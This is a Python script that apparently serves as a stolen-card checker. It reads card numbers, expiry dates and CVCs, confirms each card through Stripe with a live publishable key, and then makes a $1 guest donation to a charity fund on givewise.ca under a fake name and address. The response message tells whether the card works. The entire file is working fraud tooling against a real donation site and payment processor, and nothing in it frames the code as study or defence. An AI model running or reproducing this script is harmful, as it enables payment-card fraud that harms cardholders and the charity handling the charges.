import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]		
	r = requests.session()

	headers = {
	    'authority': 'api.givewise.ca',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'authorization': '',
	    'content-type': 'application/json',
	    'origin': 'https://fund.givewise.ca',
	    'referer': 'https://fund.givewise.ca/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'operationName': 'startIntentToGiveToGenerosityFund',
	    'variables': {
	        'data': {
	            'email': 'rodamuser08@gmail.com',
	            'firstName': 'Rodam',
	            'lastName': 'User',
	        },
	    },
	    'query': 'mutation startIntentToGiveToGenerosityFund($data: StartIntentToGiveToGenerosityFund!) {\n  startIntentToGiveToGenerosityFund(data: $data)\n}\n',
	}
	
	response = requests.post('https://api.givewise.ca/graphql', headers=headers, json=json_data)
	
	seti = re.search(r'"startIntentToGiveToGenerosityFund":"(.*?)_secret_', response.text).group(1)
	secret = re.search(r'"startIntentToGiveToGenerosityFund":"(.*?)"', response.text).group(1)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=Rodam+User&payment_method_data[card][number]={n}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_month]={mm}&payment_method_data[card][exp_year]={yy}&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F454062d83b%3B+stripe-js-v3%2F454062d83b%3B+split-card-element&payment_method_data[referrer]=https%3A%2F%2Ffund.givewise.ca&payment_method_data[time_on_page]=74772&payment_method_data[client_attribution_metadata][client_session_id]=1725a695-79b2-416f-9344-9699da7b3541&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=card-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2017&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_yfhi4BPynFBUCdg63jpQOPlT&client_secret={secret}'
	
	response = requests.post(
	    f'https://api.stripe.com/v1/setup_intents/{seti}/confirm',
	    headers=headers,
	    data=data,
	)
	
	pm = re.search(r'"payment_method": "(.*?)"', response.text).group(1)
	
	headers = {
	    'authority': 'api.givewise.ca',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'authorization': '',
	    'content-type': 'application/json',
	    'origin': 'https://fund.givewise.ca',
	    'referer': 'https://fund.givewise.ca/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'operationName': 'giveToGenerosityFundAsGuest',
	    'variables': {
	        'data': {
	            'email': 'rodamuser08@gmail.com',
	            'firstName': 'Rodam',
	            'middleInitials': '',
	            'lastName': 'User',
	            'fundId': 67118,
	            'address': {
	                'country': 'United States',
	                'lineOne': 'Street 27',
	                'lineTwo': '',
	                'city': 'New York',
	                'postalCode': '10080',
	                'province': 'New York',
	            },
	            'amount': 1,
	            'stripePaymentMethodId': f'{pm}',
	        },
	    },
	    'query': 'mutation giveToGenerosityFundAsGuest($data: GiveToGenerosityFundAsGuest!) {\n  giveToGenerosityFundAsGuest(data: $data)\n}\n',
	}
	
	response = requests.post('https://api.givewise.ca/graphql', headers=headers, json=json_data)
	
	try:
		result = re.search(r'"message":"(.*?)"', response.text).group(1)
	except:
		result = response.text
		
	return (result)
